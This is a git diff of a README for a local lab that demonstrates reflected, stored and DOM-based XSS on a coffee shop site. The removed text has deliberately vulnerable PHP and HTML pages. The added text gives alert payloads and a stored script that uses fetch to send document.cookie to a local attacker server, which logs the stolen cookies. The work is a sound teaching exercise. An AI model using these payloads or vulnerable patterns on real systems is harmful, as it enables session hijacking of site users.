@@ -1,218 +1,137 @@
-Three different pages for a **coffee shop website** to demonstrate each of the **XSS vulnerabilities**:
+# ReadMe
 
-1. **Reflected Cross-Site Scripting (Reflected XSS)**
-2. **Stored Cross-Site Scripting (Stored XSS)**
-3. **DOM-based Cross-Site Scripting (DOM XSS)**
+## Setup
 
-I'll outline each scenario with a **vulnerable website page**, explain how each XSS works, and give a potential use case where the vulnerability could be exploited.
+Steps to setup the environment.
 
-### 1. **Reflected Cross-Site Scripting (Reflected XSS)**
+> [!WARNING]
+> Prerequisites: Download XAMPP  
 
-In **Reflected XSS**, the malicious input is immediately reflected back to the user by the web server without any sanitization. This happens when the input is processed and returned by the web server.
+### Setup MySQL (Running on port 8080)
 
-#### Use Case: **"Search Bar" in the Coffee Shop Website**
-A user can search for their favorite coffee or a menu item, and the search term is reflected back on the page.
+- Start the Database Server on the XAMPP
 
-**Vulnerable PHP Page (search.php)**
+- Go to `MySQL` 
+  ```bash
+  http://localhost:8080/phpmyadmin/
+  ```
+- Create the database
+	- Database name: `db_745`
+	- Table name: `reviews`
+	- Fields: `Users`, `Comments`, `id`
+	![picture 1](images/318ae36c81032737bc4e21d6887d339cc54bb4d3339f7bf3b26ba974e4634cae.png)  
 
-```php
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Coffee Shop - Search</title>
-</head>
-<body>
-    <h1>Coffee Shop - Search Menu</h1>
+### Setup Cafe Server
 
-    <form action="search.php" method="GET">
-        <label for="search">Search for your favorite coffee:</label>
-        <input type="text" id="search" name="query" />
-        <button type="submit">Search</button>
-    </form>
+- Put `cafe` files in the following structure
+	```
+	xampp/htdocs/cafe/
+	│── assets/				# images
+	│── admin.php			# admin login page
+	│── db.php				# Database connection file  
+	│── index.php			# Main café homepage  
+	│── recommendation.php	# DOM-Based XSS demo (dynamic content)  
+	│── review.php			# Stored XSS demo (user reviews)  
+	│── search.php			# Reflected XSS demo (search bar)  
+	└── style.css			# Styling for the website  
+	```
+- Start the Web Server
 
-    <h3>Your Search Results:</h3>
-    <p>
-        <?php
-        if (isset($_GET['query'])) {
-            echo "You searched for: " . $_GET['query'];  // This is vulnerable to reflected XSS
-        }
-        ?>
-    </p>
-</body>
-</html>
+- Go to the `cafe` website
+  ```bash
+  http://localhost:8080/cafe
+  ```
+
+### Setup Attacker's Server (Running on port 8000)
+
+- Put attack file in the following structure
+	```
+	xampp/htdocs/cafe/
+	│── log.txt				# stolen information (cookies)
+	└── style.css			# stealer code
+	```
+
+- Run the attacker server using php
+	- Go to the attacker's working directory `xampp/htdocs/attacker/`
+	- Open a powershell from here and run the following command
+		```bash
+ 		C:/xampp/php/php -S 127.0.0.1:8000
+		```
+## Attack
+
+Steps to attack the vulnerable websites
+
+### **Reflected XSS**
+
+The `search` page is vulnerable to `Refected XSS`.
+
+Type in the following command to the search bar to execute an alert. The alert can  be replaced with more dangerous command.
+
+```bash
+<script>alert('XSS Attack!')</script>
+```
+![picture 2](images/7d29d04860bf17db24653480736e11b224aa69a063a02d46879812ec47cb5dd4.png)  
+
+Command got executed.
+
+![picture 3](images/7722ccbf59ac191c660bd78a90bb18756de9944e17aa55ba9e5c5a62fe003ea3.png)  
+
+
+### **Stored XSS**
+
+The `Review` page is vulnerable to `Stored XSS`.
+
+Type in the following information to the respective fields to trigger an alert.
+	- Username: Attacker
+	- Review: <script>alert('Hacked!')</script>
+
+```bash
+<script>alert('Hacked!')</script>
 ```
 
-#### Scenario:
-1. An attacker could craft a URL like:
-   ```
-   http://localhost/search.php?query=<script>alert('XSS')</script>
-   ```
-2. When the victim clicks on the link, the script executes, showing an alert box. The attacker could inject a more harmful payload (e.g., stealing cookies).
+![picture 4](images/8fdd29afff14ae78715405f81d6d40ef9cc8c8b44bfb4cfce7f130c1b2833451.png)  
 
-**Potential Damage**:
-- Stealing session cookies.
-- Redirecting users to malicious websites.
+Command got executed.
 
----
+![picture 5](images/8fb52f44749eab45020e93876f5ef2a6bdab5e8f83876585ab4c98768615b213.png)  
 
-### 2. **Stored Cross-Site Scripting (Stored XSS)**
+### **DOM-based XSS**
 
-> [!NOTE]
-> In this scenario, you need to create a `reviews.txt` file at the same directory as `review.php`
-> Also make sure that `reviews.txt` has write permission for Apache
->
-> Steps:
-> `sudo touch reviews.txt`
-> `sudo chmod 777 reviews.txt`
+The `Recommendations` page is vulnerable to `DOM-based XSS`.
 
-In **Stored XSS**, the attacker’s input is saved to the server and reflected back to all users who visit the page. It can persist across different sessions and affect multiple users.
+Type the following information to the searchbox to trigger an alert.
 
-#### Use Case: **"Customer Reviews" Section on the Coffee Shop Website**
-The coffee shop allows users to leave reviews on different drinks, but the website doesn't sanitize the input before saving it to the database.
-
-**Vulnerable PHP Page (review.php)**
-
-```php
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Coffee Shop - Reviews</title>
-</head>
-<body>
-    <h1>Customer Reviews</h1>
-
-    <form action="review.php" method="POST">
-        <label for="review">Leave a review:</label>
-        <textarea id="review" name="review"></textarea>
-        <button type="submit">Submit</button>
-    </form>
-
-    <h3>Latest Reviews:</h3>
-    <div id="reviews">
-        <?php
-        // Assume this is getting reviews from a database
-        if ($_SERVER['REQUEST_METHOD'] == 'POST') {
-            $review = $_POST['review'];
-            // Vulnerable: The review is saved without sanitization
-            file_put_contents('reviews.txt', $review . "\n", FILE_APPEND);
-        }
-
-        // Display reviews
-        $reviews = file('reviews.txt');
-        foreach ($reviews as $review) {
-            echo "<p>" . $review . "</p>"; // This is where the malicious script can run
-        }
-        ?>
-    </div>
-</body>
-</html>
+```bash
+<img src=x onerror="alert('XSS Attack')">
 ```
+![picture 7](images/0503aa4ab076abe69a770889a50877de9344dd1261ca48a940b1e6ae64d9760d.png)  
 
-#### Scenario:
-1. An attacker submits a review like this:
-   ```html
-   <script>alert('XSS')</script>
-   ```
-2. The review is stored in the `reviews.txt` file and will appear for any user who visits the reviews page. When any user views the page, the injected script executes.
+Command got executed.
 
-**Potential Damage**:
-- If the attacker injects malicious JavaScript, they could steal session cookies, hijack accounts, or perform other malicious actions.
-- This could impact all users visiting the reviews section.
+![picture 8](images/edfa812d518fb90f88ac9437445408755ccd0083132e43aeb83dfb74ef796fa5.png)  
 
----
+## Advanced Attack
 
-### 3. **DOM-based Cross-Site Scripting (DOM XSS)**
+> [!WARNING]
+> For this attack to succeed, the attacker php server needs to be running.
 
-In **DOM-based XSS**, the client-side JavaScript itself handles and processes user input, and the vulnerability arises due to improper handling of the data on the client side, without any server interaction.
+In the previous examples, the just execute the alert.
 
-#### Use Case: **"Coffee Recommendation" Based on User Input**
-The coffee shop website uses JavaScript to give recommendations based on user input (e.g., favorite coffee flavor).
+In this section, we'll try to steal cookies (including user login cookie) from the `Review` page.
 
-**Vulnerable HTML Page (recommendation.html)**
+As an attacker, type the following input to the respective fields in the `Review` page.
+	- Username: Attacker
+	- Review: `<script> fetch('http://localhost:8000/steal.php?cookie=' + document.cookie); </script>`
 
-```html
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Coffee Shop - Coffee Recommendation</title>
-</head>
-<body>
-    <h1>Coffee Shop - Find Your Perfect Coffee</h1>
+![picture 9](images/459c41dd8d46cd6559aa018fe5d29b9c596b894e2210038b93d8a61fc6592dfa.png)  
 
-    <label for="flavor">Enter your favorite coffee flavor:</label>
-    <input type="text" id="flavor" name="flavor">
-    <button onclick="getRecommendation()">Get Recommendation</button>
+Every time a user use this page, the cookies will be sent to the attacker's server in file `log.txt`
 
-    <h3>Your Recommendation:</h3>
-    <div id="recommendation"></div>
+![picture 10](images/0ac942705ee67ff16ac01950db4af7d9a92e524daa93e3bdef6cb779daaa1b16.png)  
 
-    <script>
-        function getRecommendation() {
-            var flavor = document.getElementById('flavor').value;
+The cookies are stolen.
 
-            // Vulnerable: inserting input into HTML without sanitization (DOM-based XSS)
-            document.getElementById('recommendation').innerHTML = 
-                "We recommend the " + flavor + " latte!<br>";
+![picture 11](images/f5373aaf1146fda23ae35c680fea5046866fced15a33784240678d2a748f0b3f.png)  
 
-            // Added example: Injecting another XSS vulnerability in the HTML context.
-            document.getElementById('recommendation').innerHTML += 
-                "<img src='invalid.jpg' onerror='alert(\"XSS via Image\")' />";
-        }
-    </script>
-</body>
-</html>
 
-```
-Expected Outcome:
 
-    When you input <script>alert('XSS')</script>, it won't trigger an alert, but the vulnerable code will still insert the input into the DOM.
-    The XSS payload won't be executed directly, but the onerror event in the <img> tag will still trigger the alert because the image fails to load.
-    The alert box should pop up with the message: "XSS via Image".
-#### Scenario:
-1. An attacker could submit a malicious flavor like:
-   ```html
-   <script>alert('XSS')</script>
-   ```
-2. When you input <script>alert('XSS')</script>, it won't trigger an alert, but the vulnerable code will still insert the input into the DOM.
-- The XSS payload won't be executed directly, but the onerror event in the <img> tag will still trigger the alert because the image fails to load.
-- The alert box should pop up with the message: "XSS via Image".
-
-**Potential Damage**:
-- The attacker could execute arbitrary JavaScript, which could lead to session hijacking, redirecting the user to phishing sites, or other malicious actions.
-- Since this happens on the client-side, the attack only requires the victim to interact with the page.
-
----
-
-### Summary of the Three Vulnerabilities:
-
-1. **Reflected XSS**:
-   - Occurs when user input is reflected immediately by the server (e.g., via a search bar).
-   - Example: An attacker could send a link with a malicious payload that runs in the user's browser when clicked.
-
-2. **Stored XSS**:
-   - Occurs when malicious input is stored by the server (e.g., in a review or comment section).
-   - Example: An attacker submits a review with a malicious script, and every user who views the review will have their browser execute the script.
-
-3. **DOM-based XSS**:
-   - Occurs when client-side JavaScript processes unsanitized user input (e.g., a recommendation form).
-   - Example: A user enters a malicious input that gets inserted directly into the page via `innerHTML`, allowing for script execution.
-
----
-
-### Demonstration:
-To demonstrate these vulnerabilities, you can:
-1. **Set up each of these PHP or HTML pages** on your local server.
-2. Test each scenario:
-   - **For Reflected XSS**: Enter a search query like `<script>alert('XSS')</script>`.
-   - **For Stored XSS**: Submit a review like `<script>alert('XSS')</script>`.
-   - **For DOM-based XSS**: Enter a flavor like `<script>alert('XSS')</script>` in the input field.
-
-These examples will help showcase the dangers of XSS and why proper sanitization, validation, and encoding are crucial to protect web applications from such attacks.
-
-Let me know if you need further clarification or adjustments to these pages!
